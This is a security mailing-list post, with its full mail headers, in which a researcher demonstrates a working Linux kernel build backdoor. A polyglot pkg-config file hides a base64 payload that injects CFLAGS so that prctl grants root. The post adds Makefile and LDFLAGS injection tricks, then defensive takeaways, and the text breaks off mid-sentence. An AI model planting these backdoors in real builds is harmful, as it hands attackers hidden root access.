Received: (qmail 1684 invoked by uid 550); 17 Apr 2024 12:41:49 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 15495 invoked from network); 17 Apr 2024 00:08:06 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=oracle.com; h=message-id : date :
 subject : to : from : content-type : content-transfer-encoding :
 mime-version; s=corp-2023-11-20;
 bh=3lVDzT2tacj7zZCBO4HAwd6WkKFmIjHWXpw/8rVqbuw=;
 b=glbEtH7Cvrd/gkZavW0kRlEGvJW/YiTVd2WaBRVqpqTlN+pfu1uhDtrLVIvV7q/lSlE+
 NLdHODKZ16MYDRHg49NhSiofe7K6BPLRms5n54xFWMfZGID5rthq0HfDguD2uK06Yg8r
 JlRuYphRZ5edfZPMHIz9ZdIaAsxgzMClnJE3hhHmt7qOLTHVGzFfgbWnifzabsmYNEgh
 cWHwTNevnM6CPFrc5MA9/MdFGl0rvKfT0xKD0oaiQ826HJ1MudfcwL8Sv33ITQNHlCdE
 S8ZBKjzuXbbobjc2htG68IqR7+ZwZ9e4dNas6JOLwL8e/WLOU99XgsM9WSVMXDM2zefP JA== 
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=XjF+Mnto4++87BzEj7/lSrobVtvkqidnL9n1QHigv4sSKhutcWuVvivh1NIpBzl3P3CWHg/j2xIG2LiScMrmqV3EI6mjkhbrsD4eCFwBHd08TEIBYBJBgiHRCKWvWmZGjZ+fJF//SiPO6BHUUU1WJ+aWRQQbM9+LhtFfte1lCBJYJYdJBE2GyvD214Qh0ZZqEaEFdQJDoG0vDP3YKSpvw80xmBNf872+VsH7aUpWhDMM6v6srvqZpZRVeZnpFgPF4TUjuOhEVxUCNe/nvfOmRgBHEwkk5ZBOI1a6iLFxUvnahaWSWkIYD0J9dKzPvkOVPLj4FIcxyaAB2QmNUC6aUQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=3lVDzT2tacj7zZCBO4HAwd6WkKFmIjHWXpw/8rVqbuw=;
 b=Zei+U2SyW4fIaOQLqE1svg9QBMcjiBbR5oVDky2QKm46oFUqqhUdNkcz6EsiV5m0XL0srY4cvJOwKISMNQR15t3qwUKTqv0wEYkkSVmhMj7xK0zXgvt/wLkqdp+PT+zsNENfJq1mYV11lc4sqT7oG47U/Tpto9DuOltboUWADiPlqqG9ih8a3JWFUrnCNkEp/RPq3qNbWc4APqWyhqb+rnuy1ybK+G9eFaIEFbhfwpSmSdM4P93M1C00b+xTxXIEDuXshhbEhC/5Db1e25Rc0BK2YpGijyrbv1OXfDCIN4gAEW3wXcn6HL7hO9jO3vcEXwPHt5y0lVgl8PgC8KJ/UA==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=oracle.com; dmarc=pass action=none header.from=oracle.com;
 dkim=pass header.d=oracle.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=oracle.onmicrosoft.com; s=selector2-oracle-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=3lVDzT2tacj7zZCBO4HAwd6WkKFmIjHWXpw/8rVqbuw=;
 b=bzOMEqmi5X6CzX9a9e5EcUBUYlzMsCoqxRUvv/snJnOZCzp1fG8anLmEOJzkObhfl9Iy72ijuSDCEY3tw8/wKRXZ27pQHUHEvOR3pzzS4NM9k1iw9Am4NRpaNy1OacHJuX3ATBBeJWvwRJSx7tNwWYAF+WqHgvBAsQZL5X9PeMc=
Message-ID: <9a12a2bb-21ba-43fe-bfbb-8f9b1fd36f1a@oracle.com>
Date: Wed, 17 Apr 2024 02:07:43 +0200
User-Agent: Mozilla Thunderbird
Content-Language: en-US
To: oss-security@lists.openwall.com
From: Vegard Nossum <vegard.nossum@oracle.com>
Autocrypt: addr=vegard.nossum@oracle.com; keydata=
 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 8A==
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 7bit
X-ClientProxiedBy: PR1PR01CA0021.eurprd01.prod.exchangelabs.com
 (2603:10a6:102::34) To PH0PR10MB5433.namprd10.prod.outlook.com
 (2603:10b6:510:e0::9)
MIME-Version: 1.0
X-MS-PublicTrafficType: Email
X-MS-TrafficTypeDiagnostic: PH0PR10MB5433:EE_|PH8PR10MB6528:EE_
X-MS-Office365-Filtering-Correlation-Id: ba5c8979-da92-489a-95f6-08dc5e726a46
X-MS-Exchange-SenderADCheck: 1
X-MS-Exchange-AntiSpam-Relay: 0
X-Microsoft-Antispam: BCL:0;
X-Microsoft-Antispam-Message-Info: 
	XtvN37tL1LRvQON0JV2MB9yyfCAETRYSG4qtPAFwoHOgQdwmSeu6zrLgRpIOWy9ZbkI/QPty81fIsxDOoV3Da5sG7bCfc7D8EmFOipl5BGKk2X4CfigShpgwmai0cI7EQmsjkVur+j5jLPx7bZOPIPpfgYni8qTVh04oFL4M4ybrGr14eJDqvPILk33zec8aHnLsdweYze8Q8W0A0F98Vj40uX7X+WdRWjTu4HEC+uNiFFLdajnqbSJpYjsyTqibkXBM+X7JxPRSBTqKrVtmurr3OH8Kz1gpTyM/te6+fkDV0w1xBCwIE9sVlle8X8GZCUgeWPt8i75zbPrJ3fiUQtbveOGPT5VAHdUdawK8sSgVfEuelJuJW+OqazCgz3ZGL18l0E3WcSfY/XSxzVYfyeeJN++dGaa98zVS5GHhvNMVKBydhK1q/Hv5uQxUk5XqsO7ZuIDKGaDpPLmiZO2Ve0/NPSKjX6Ns+lOGHOQd5p02hKU8oWKtJVvV7J7WZBDwNcYJwLsV5qy2zhIztK1ja0fZWp+X0eqsrwsSC+mzmaM2m/Bg4aJ8vP8IME8zRjEzmt7hyzlL+QUduNa6cnkTJ6u8b1umSVkmpe0vdny09cA=
X-Forefront-Antispam-Report: 
	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:PH0PR10MB5433.namprd10.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230031)(366007)(1800799015)(376005);DIR:OUT;SFP:1101;
X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-MessageData-0: 
	=?utf-8?B?WkY1emR5MHVhYnNQS3hZUzFsR3ZtVDJuMXMwOWxzV21UZXZZa2gvZUlKMnNz?=
 =?utf-8?B?MHhiZmNOcVNCdEl1Yis3Z0dIVzNIN0FuZm5rdmdFbE5xemROSjdTZ2JUNWJW?=
 =?utf-8?B?c1ZOZnJ6LzBCOFk2aGh6RDFUMDZ2cDI2ZlR6VS9JbjQvZWtLRzFPQWdMMlF3?=
 =?utf-8?B?SEl0ZkkyUUlTYnhmaW44U2ErQ2dJZ2gxQngxcDJXWTl2NGFPWnYza0YyTmtT?=
 =?utf-8?B?WDFSWUpoTDNqanJKaVluUDhGbm12TmU2SHZUb0U1VlFQQWpmTitYV2RTOU5I?=
 =?utf-8?B?QkZ1ODFkT2NINkVYOFBFLzkydnllWXlMUmNtdnBsNFRDNllyaEFhYzRVbHNu?=
 =?utf-8?B?UnMrTUVxVElrdGxMZmxKVUw5Q1Jmb2JYamIxZjdZbVczSjBBeGhrenRuVUx6?=
 =?utf-8?B?SjhraXl5L3ZKS2c5WWMvbWYyZldBaDVxR2ZqSEdscjVMbjRXSTMzT2tmZ2hH?=
 =?utf-8?B?NDF3b0pibk1uSlQ0alI0bUNHTHdCbnZleGlTNFQ0SEdHNCtHWUZtYVA5QlJB?=
 =?utf-8?B?cEQ2dnVzVVZqMUpvUzk3N3puemcraU03ZHA4UkFvSEs1RDJnZmJUT2lnb1p3?=
 =?utf-8?B?Q09yNERKZW9JYmRiR3pqbXZtVldQaGRsWFY1UHA5a0xWLzF5ODdLUXpsQlFo?=
 =?utf-8?B?ZDlEQlowanZaRE9YM1A1TG1VbDRsUFZxVXpUWU5zRmQ4bVdtRy9qamJRSjl6?=
 =?utf-8?B?cFNMendURUl2b2hudEl3ZThiOVpUWGowNW03cy8xZnA0Zkt1eENOZkdyalVo?=
 =?utf-8?B?SW9VUUZpRVMrVE5BMjRJVHhwUFZaRVhyRVRReU1YNHBlamE1V3NranZZUGY1?=
 =?utf-8?B?aVJ2UUpGS01wYW0raDhQamFEQWNOdDArNGhvQUxHUk5LRmd4TFJsU0NDQk9h?=
 =?utf-8?B?dGpKa3RLRzNuTnlCbzd3dUdYc0FZMURVNXNVNUVyVVBqUTVLUHVJbktJQzgz?=
 =?utf-8?B?N2VHSzRiVHRTT1RscjFPUG1lNTZVMmpXd0YvemtzdHRjaHNsNm54enR5eEx2?=
 =?utf-8?B?enVOOU96aTd6RkxoSW1aRDR1UXpzKzFaTklaMlFRc1hmWHU3TW8yZFllcWFW?=
 =?utf-8?B?Vk1QVnpXNkJaYndTVXA3ZlFRaFB6c1F1WURuQlpVVTYzaHhyUEFIOUw3QTA5?=
 =?utf-8?B?UFJHZTUvR2V4WDllRUM0SnBjdnVTQXgxY1NiZ3U0Q1ZzYTdzeFo5bkNWT3Jn?=
 =?utf-8?B?YVlsRE1jcXNxbG90d05sUElabE1NNDF1M0FseEJtczlNWWdNSENvQWNGVWk2?=
 =?utf-8?B?bVlYWTVFUkJvZWxBT2ViS1I5aEJTY2JCVE1QR292Mk1GOXU0UkVobnZxaGJF?=
 =?utf-8?B?eEdIcmFkOXRwSzNuUGtNaVVtbnNIR0lLUlJwOEdqanNpVi9zdWQ0ZFB3YnZR?=
 =?utf-8?B?dDVXdzk5YitML1NUc2tJQ1VFQVpwS2hWY3RTRTg4a3RXUGdGZ3llR3NzOUs5?=
 =?utf-8?B?UG5zY2tzOXpjdEdkZWdUL2VUczFDMVdjVHhkT25HLzNWcEhiMkVKbHQ1di9r?=
 =?utf-8?B?K3N3QVhpUEdDbTZMSStYeFgyUzVBcHl3b2VmMENEMU5xdUVUcnhUUkZVVDNv?=
 =?utf-8?B?UmN3Q3A5NVVQMGZVSjBTNjB5Sml5QVFrY2hhN0hZQU9BUkRSU0V2VE9GSzd4?=
 =?utf-8?B?Ykowc1hnT0xWU01ZTUdiRXp1VHNaaTF5NlV4d3YrZXZUd0oyMW4vclBwZUFr?=
 =?utf-8?B?dWdVeHA5OVl1c1hWb01PNzVTWHQ5SmZlR0VwTEJhUlpjcmQvSWVQaHRUaDFE?=
 =?utf-8?B?aFIxb0JrYWw0M1JLWnRrTkhHSDNBME5YTjRpb0F2dzNaQThWUitHa21iL3Zl?=
 =?utf-8?B?VzFURW1lNmVBckpLVzBNL2g2QThlZzRnRElWeWxUYldtTWhidzN5ZUxrNzRl?=
 =?utf-8?B?eFlZUmpMUldLSk9nYndWclJZWDQzOStSYWdxMjBQNnc4RmtSMVFSMjd0Qk5u?=
 =?utf-8?B?aFloWUhPaDhpYTBpOVI5YTJ0KzE2aXFPZGJZS0prWkF0NHBMNEhyM281YXIz?=
 =?utf-8?B?cXhWVUFYbjAxSW1QaU1MZjIvUy8yS0Q3ZVVuaHVuQkZpb1pBdEErQ2IxUWpD?=
 =?utf-8?B?ZjdDTWg2emYvYjNobGFMbFBNSnlJc0dobGFzN05XY3V0cUhLV3ZSdk1nRjk2?=
 =?utf-8?B?bkR3M1VxTUdxS0NrcDB0bUNYNzM2Q2k0V2xlMDNhN2FvUENFUll2SSt5QytE?=
 =?utf-8?B?RHc9PQ==?=
X-MS-Exchange-AntiSpam-ExternalHop-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-ExternalHop-MessageData-0: 
	SD8jMtb/wCtXmIsS90sP3OhQRETVZKhjHp+Fb9nheIoK35ZYyrUwQMU5cEWY8Yq9SggB3k1fGj2vcmie6JHAGUnJsMI0rNBoFBDsT+Zgm9hln30DLlKqo+FbY74SeWXQUCaRRNY7fclhqJyM5/gkPC4ncQZaDN5WLdj7EnQ03IVXHUBR27N1f0WYhyQcJHLPd3svyGMzE14I5q8tuzZL9WDtZUMvxiwWeFcaJFFQhvLjmYKrKxvd8EjntquYjNUd+CEQFC/0gkrzrwcoP1XnMwsVcnqVT6nbNYuTJyMGaqbdbbY7VBkt4Gr4obEX1qVr2RLrBZfQOmqWRbVOcjpxlsyT/cPk4fK+bYLfSOBIn/oExSsmyaA102dIrdkWBZsgHG4JXPwIKfU94I8lrmEsV5Ynw/hbwvXYzJcndzk3xNt7QFuKtakAfdMax0PB2Vw7HrsmKSsAgpDV72EZP+pBQB+zhS5nh1wWgdd1vawVBdnHbSMWV2+h2WUJ+MVS06UaA2blFdPX3Iz+fjo3+WqH6QboPOcbjgEwSWguIUFqazXd0B1/ASdiV1Sn/r1khWLdOoST0gTZsvHMPQjLaS69DtcZkRGoe48QmBp+Ch7LcEY=
X-OriginatorOrg: oracle.com
X-MS-Exchange-CrossTenant-Network-Message-Id: ba5c8979-da92-489a-95f6-08dc5e726a46
X-MS-Exchange-CrossTenant-AuthSource: PH0PR10MB5433.namprd10.prod.outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 17 Apr 2024 00:07:48.4270
 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: 4e2c6054-71cb-48f1-bd6c-3a9705aca71b
X-MS-Exchange-CrossTenant-MailboxType: HOSTED
X-MS-Exchange-CrossTenant-UserPrincipalName: luK00JqhjzlRNxMRpJ/WHheq5237ClTOy6hKt9jgVgQGmGutfIjYNDbKbnh0IYSgZeAYe1URhJ35mtVSCkfYHLgwHjrqsl1klhHqV17girI=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: PH8PR10MB6528
X-Proofpoint-Virus-Version: vendor=baseguard
 engine=ICAP:2.0.272,Aquarius:18.0.1011,Hydra:6.0.619,FMLib:17.11.176.26
 definitions=2024-04-16_19,2024-04-16_01,2023-05-22_02
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 mlxlogscore=999 adultscore=0
 phishscore=0 bulkscore=0 spamscore=0 malwarescore=0 mlxscore=0
 suspectscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.12.0-2404010000 definitions=main-2404160157
X-Proofpoint-GUID: vKWc6Ia1K_JWhvFX5XGSX3Ua20jKgrFk
X-Proofpoint-ORIG-GUID: vKWc6Ia1K_JWhvFX5XGSX3Ua20jKgrFk
Subject: [oss-security] Make your own backdoor: CFLAGS code injection, Makefile injection,
 pkg-config

Hi all,

Given the recent xz/sshd backdoor, I wanted to try to think more like
an attacker and build my own backdoor.

To start off, I've chosen the Linux kernel as the target for the attack,
and I want to do it without changing either the kernel source code or
any release tarballs.

In other words, the backdoor would have to rely on compromising some
_other_ package that gets installed on a distro build server that is used
for building the kernel for that particular distro.

For my particular backdoor it doesn't really matter which exact package
is compromised; all that is required is the existence of a file
/usr/lib64/pkgconfig/libelf-uninstalled.pc with mode 755 and containing
something along the lines of:

   prefix=/usr
   exec_prefix=/usr
   libdir=/usr/lib64
   includedir=/usr/include
   f=$objtree/include/config/auto.conf
 
sig=Q0ZMQUdTX3N5cy5vPSctRFNFVF9FTkRJQU4oeCx5KT0tMjIsY29tbWl0X2NyZWRzKCh2b2lkKilpbml0X3Rhc2suY3JlZCknCg==
   grep -q sys.o $f || sed -i "/ELFCORE/a $(echo $sig | base64 -d)" $f; exit

   Name: libelf
   Description: elfutils libelf library to read and write ELF files
   Version: 0.189
   URL: http://elfutils.org/

   Libs: -L${libdir} -lelf
   Cflags: -I${includedir} 
-DLIBELF='$(/usr/lib64/pkgconfig/libelf-uninstalled.pc)'

   Requires.private: zlib libzstd

(This is based on an existing file for libelf, typically located at either
/usr/lib64/pkgconfig/libelf.pc or
/usr/lib/x86_64-linux-gnu/pkgconfig/libelf.pc.)

Now, you could argue that this is easy to spot -- why would a pkg-config
file contain base64 data, why would an unrelated package contain something
that looks like it belongs to libelf, etc. I would argue that the above
looks suspicious but not necessarily like a kernel backdoor and could
potentially pass for a legitimate file; moreover, that a malicious
maintainer could introduce it into a less well-reviewed distro package
that happens to be installed by default.

In any case, let's see how it works:

When you call 'pkg-config --cflags libelf' (like the kernel build system
does), this will output:

   -DLIBELF='$(/usr/lib64/pkgconfig/libelf-uninstalled.pc)'

This string will get used by 'make' and passed along to the shell, which
runs /usr/lib64/pkgconfig/libelf-uninstalled.pc as a shell script.

When the file is run as a shell script, it starts at the top and sets
prefix, exec_prefix, etc. as local variables. It also sets f, sig, and
then runs:

   grep -q sys.o $f || sed -i "/ELFCORE/a $(echo $sig | base64 -d)" $f; exit

(The 'exit' here is to stop the shell from emitting error messages from
the subsequent lines.)

This code checks whether 'sys.o' is in $objtree/include/config/auto.conf,
which is a file used by the kernel during the build ($objtree is defined
by the kernel build system) -- if not, it runs:

   sed -i "/ELFCORE/a $(echo $sig | base64 -d)" $f

This just looks for any line containing the string "ELFCORE" (again in
auto.conf) and appends another line at that point in the file. If we
decode the base64 string, we see that it adds the line:

   CFLAGS_sys.o='-DSET_ENDIAN(x,y)=-22,commit_creds((void*)init_task.cred)'

I should mention that libelf is used to build 'objtool', a program that
itself runs during the kernel build. It is typically built early in the
build, which gives us a chance to hook into the build system before any
real kernel code is compiled.

Anyway, after the script is run, include/config/auto.conf will contain
something like:

   ...
   CONFIG_ACPI_PROCESSOR=y
   CONFIG_ELFCORE=y
   CFLAGS_sys.o='-DSET_ENDIAN(x,y)=-22,commit_creds((void*)init_task.cred)'
   CONFIG_HIBERNATION_SNAPSHOT_DEV=y
   CONFIG_HAVE_KVM=y
   CONFIG_PCCARD=y
   ...

(I chose CONFIG_ELFCORE= as the insertion point because 1) it's in the
middle of the file so it's unlikely to be easily spotted at the top or
bottom, and 2) it has that semi-plausible connection to libelf).

This file, include/config/auto.conf, is read by GNU Make and the kernel
build system. Even more, it's _evaluated_ by the build system, meaning
that it is actually a Makefile that can contain arbitrary Make code. In
this case, the additional line sets the variable CFLAGS_sys.o, which
contains extra CFLAGS passed to the compiler for any object files named
sys.o, such as kernel/sys.o, at build time.

The flag passed to the compiler is:

   -DSET_ENDIAN(x,y)=-22,commit_creds((void*)init_task.cred)

(Thanks to Michael Ellerman for the suggestion to use commit_creds().)

This has the effect of defining the macro SET_ENDIAN(), and for
kernel/sys.c (when compiled on x86, at least) would have been defined in
the same file with:

   #ifndef SET_ENDIAN
   # define SET_ENDIAN(a, b)       (-EINVAL)
   #endif

It gets used like this:

   SYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned 
long, arg3,
                   unsigned long, arg4, unsigned long, arg5)
   {
   ...
           switch (option) {
   ...
           case PR_SET_ENDIAN:
                   error = SET_ENDIAN(me, arg2);
                   break;
   ...
           return error;
   }

Now we see that whenever you call prctl(PR_SET_ENDIAN) from userspace,
the code will expand to:

           case PR_SET_ENDIAN:
                   error = -22,commit_creds((void*)init_task.cred);
                   break;

...which of course means that it still returns -EINVAL, but it additionally
also makes the calling process root.

No .c or .h source code was touched and there won't be many traces of the
code during or after the build, except:

  - kernel/.sys.o.cmd
  - include/config/auto.conf
  - perhaps the console/build log if the kernel is built with V=1

However, these files are considered internal to the build system and
normally won't appear in RPMs, manifests, debug info, or anything like
that. There is no foreign object file, no missing symbols, and no missing
debug info.

(I should add that we could potentially also attempt to clean these files
up by inserting additional Makefile code into CFLAGS_sys.o. I'll leave it
as an exercise to the reader...)

Moreover, kernel/sys.o already contains many calls to commit_creds(), and
so it won't look particularly suspicious or out of place even when looking
at the object code/disassembly.

I did an end-to-end test on one (unnamed) distro and the backdoor works.

I originally attempted to use a file in /etc/bash_completion.d/ or
/etc/environment.d/ to set the 'sub_make_done' environment variable to:

   $(eval export CFLAGS_sys.o := 
"-DSET_ENDIAN(x,y)=-22,commit_creds((void*)init_task.cred)")

(which would get evaluated by Make); however, these are not read by
non-interactive shells and so likely wouldn't affect a distro's build
process -- nevertheless, it demonstrates another pitfall: the fact that
Make allows you to override arbitrary build-internal variables with
environment variables and that those strings are evaluated as Makefile
fragments and can contain essentially arbitrary code (see
<https://lore.kernel.org/tech-board-discuss/872f9cfd-5c19-4a82-bf75-6256265e8f8a@oracle.com/>
as well for a bit more on this).

To sum it up, here are some of my takeaways (no doubt known by many
others already):

- Beware of search paths. pkg-config searches a few different directories
   and it may be possible to quietly drop something in that will inject
   itself into the build process.

   Of course, search paths already have a bit of a reputation and the
   other famous ones are PATH and LD_LIBRARY_PATH which are also viable
   vectors in this case, assuming you can either influence the list itself
   or place a malicious file within one of the earlier components.

   I would also consider locales a potential vector -- on my system,
   running 'make' searches /usr/share/locale/ as well as
   /usr/share/locale-langpack/ and one could imagine a malicious
   translation file containing printf formats with %n, for example, to
   induce memory errors. (I'm not familiar with the file format, but
   depending on how well the parsers have been tested/fuzzed, it might
   be possible to do something with intentionally corrupted translation
   files as well.)

- Beware of polyglot files. In this case, a pkg-config metadata file
   doubled as a shell script. In the xz backdoor, binary test data also
   contained shell scripts and object files.

   I unfortunately lost the source, but I read somewhere that valid PNG
   files can have arbitrary data appended at the end, which seems to be
   true in a cursory test. There will undoubtedly be other unexpected
   combinations of files that can be used to hide payloads.

- Speaking of hiding payloads, one could imagine using ANSI escape
   sequences (e.g. save + restore cursor location) to hide some parts
   of files from being output into a terminal (e.g. cat) -- however, this
   is unlikely to be effective for files that are frequently modified
   with text editors (i.e. source files). For intermediate/generated
   files or typical console output it might not hurt the attacker to try
   this to avoid detection.

- Beware of environment variables. Shellshock-style "bash function"
   overrides of commands, Makefile injections, search paths, build
   flags: these and more can all be used to subtly influence other
   programs down the line and often don't really leave a trace in either
   source code, object code, or build logs.

   Apart from CFLAGS, we can also use LDFLAGS to inject a fragment of
   Makefile code that checks whether $@ is a particular target, and if
   so, includes an additional object file:

     $ LDFLAGS='$(if $(filter target,$@),malicious.o,)' make target
     cc   malicious.o  target.c   -o target

- Eval... since it often means running code that doesn't exist anywhere
   as a file (and is thus difficult to capture in SBOM-type solutions).
   Shells and Make both have eval.

- File descriptors can be useful for passing data around without leaving
   a filesystem footprint. We could imagine a malicious shared object
   opening a file and later manipulating some command down the line into
   using the file descriptor as an input:

     fd = memfd_create(...);
     write(fd, ...);
     dup2(fd, 9);
     close(fd);
     ...
     setenv("CFLAGS", "$(eval $(shell cat <&9))");

   Here, CFLAGS would get expanded by 'make', resulting in using the shell
   to read from the file and evaluating the result as a Makefile fragment,
   while CFLAGS itself would be set to an empty string as long as the
   Makefile fragment doesn't output any text.

- Symlinks have a rich history of exploitation and can be used to
   temporarily redirect an otherwise legitimate path to malicious content.

- __attribute__((constructor)) can be used to run code when a shared
   library is loaded and would be fairly easy to inject through CFLAGS
   (either using -include or -D)

- Perhaps the most important takeaway of all is that it's not just a
   project's code, not even a project's direct and indirect runtime
   dependencies, but ALL its build dependencies as well, that can be used
   to inject backdoors. The kernel doesn't depend on any shared libraries
   at runtime -- but as long as we can hijack the build process, we can
   fairly easily inject code into the compiled kernel.

   On my system, a kernel build runs more than 70 different binaries and
   loads more than 32 distinct shared libraries. That's a large attack
   surface.

   I happen to care more about the kernel, but much of what I've described
   here would apply to other typical C projects.

Many of the things above are known from traditional exploits, but not
necessarily in the context of trying to influence a build system.

I don't want to make too many recommendations, but here are some that
came to mind:

1) We should build software in sanitized, minimal environments. In
    particular, GNU Make looks like an easy target due to how it imports
    environment variables and evaluates their contents lazily whenever
    they are used. Maybe this should be made non-default behaviour.

2) In general the practice of passing settings and configuration
